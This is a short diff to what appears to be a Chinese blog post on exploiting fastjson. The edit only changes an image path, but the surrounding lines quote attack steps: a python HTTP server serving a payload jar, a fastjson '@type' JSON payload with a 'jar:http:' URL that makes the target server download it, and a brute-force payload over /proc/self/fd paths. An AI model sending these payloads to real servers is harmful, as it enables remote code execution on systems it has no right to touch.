@@ -286,7 +286,7 @@ python -m http.server 18080
 
 第一步，发{**"@type"**:**"jar:http:..3232261291:18080.probe!.POC"**,**"x"**:**1**}，迫使服务器下载jar包。
 
-![](D:\Blogs\hanekoto_blog\src\content\posts\fastjson-1\8.png)
+![](8.png)
 
 第二步，构造字典进行爆破。{"@type":"jar:file:.proc.self.fd.N!.POCN","x":1}
 
